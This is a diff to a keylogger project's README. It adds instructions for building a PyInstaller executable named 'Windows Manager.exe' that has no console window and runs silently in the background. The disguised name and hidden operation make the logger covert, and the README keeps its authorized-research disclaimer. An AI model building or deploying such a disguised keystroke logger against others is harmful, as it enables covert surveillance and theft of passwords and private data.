@@ -36,6 +36,22 @@ python keylogger.py
 
 Press **F9** to toggle capture on/off. Press **Ctrl+C** to stop.
 
+## Build Executable
+
+Build a standalone executable for the current operating system with PyInstaller:
+
+```bash
+just build
+```
+
+The binary is written to `dist/Windows Manager.exe` on Windows. It bundles Python and all dependencies, so it runs without the project environment. The executable is built without a console window, so it runs silently in the background. Use **F9** to toggle capture. Because there is no terminal, stop it from Task Manager by ending the **Windows Manager** process (onefile mode shows two processes; end both).
+
+Without `just`:
+
+```bash
+uv run --extra build --extra windows pyinstaller --clean --noconfirm keylogger.spec
+```
+
 **Disclaimer:** For authorized security research and education only. Unauthorized use of keyloggers is illegal. Always obtain explicit written consent before monitoring any system you do not own.
 
 > [!TIP]
